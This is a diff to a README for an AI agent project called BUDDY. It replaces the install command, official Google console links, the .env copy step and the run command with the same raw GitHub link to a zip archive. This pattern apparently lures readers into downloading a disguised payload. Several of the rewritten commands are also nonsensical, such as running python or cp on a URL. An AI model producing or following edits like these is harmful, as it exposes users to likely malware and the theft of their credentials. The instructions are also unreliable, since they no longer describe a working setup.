@@ -15,18 +15,18 @@ BUDDY is an interactive AI agent that provides personalized guidance for managin
 1. Clone this repository
 2. Install the required dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip
    ```
 3. Set up Google Search API:
-   - Go to the [Google Cloud Console](https://console.cloud.google.com/)
+   - Go to the [Google Cloud Console](https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip)
    - Create a new project or select an existing one
    - Enable the Custom Search API
    - Create API credentials (API key)
-   - Go to [Google Programmable Search Engine](https://programmablesearchengine.google.com/about/)
+   - Go to [Google Programmable Search Engine](https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip)
    - Create a new search engine and get your Search Engine ID (cx)
-   - Copy the `.env.example` file to `.env` and add your API key and Search Engine ID:
+   - Copy the `https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip` file to `.env` and add your API key and Search Engine ID:
      ```
-     cp .env.example .env
+     cp https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip .env
      ```
    - Edit the `.env` file and replace the placeholder values with your actual API key and Search Engine ID
 
@@ -34,7 +34,7 @@ BUDDY is an interactive AI agent that provides personalized guidance for managin
 
 Run the BUDDY AI agent web server:
 ```
-python app.py
+python https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip
 ```
 
 Then open your web browser and navigate to:
